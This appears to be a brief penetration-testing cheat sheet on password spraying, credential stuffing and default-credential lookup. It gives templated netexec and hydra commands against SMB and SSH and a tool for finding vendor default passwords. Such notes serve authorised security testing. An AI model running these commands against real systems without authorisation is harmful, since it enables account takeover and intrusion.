# Spraying, Stuffing & Defaults

Spray one password across a subnet — netexec handles the whole CIDR:

```bash
netexec smb <CIDR> -u <USERLIST> -p '<PASS>'
```

Credential stuffing from a leaked `user:pass` list — `-C` takes colon-separated pairs:

```bash
hydra -C <USERPASS_LIST> ssh://<TARGET>
```

Look up default creds by product or vendor:

```bash
pip3 install defaultcreds-cheat-sheet
creds search <PRODUCT>
```

Combine found defaults into `user:pass` format → feed straight into hydra `-C`.

> [!tip] Check product documentation when `creds search` comes up empty — setup guides almost always list the default. Same for routers in internal test environments, often never changed.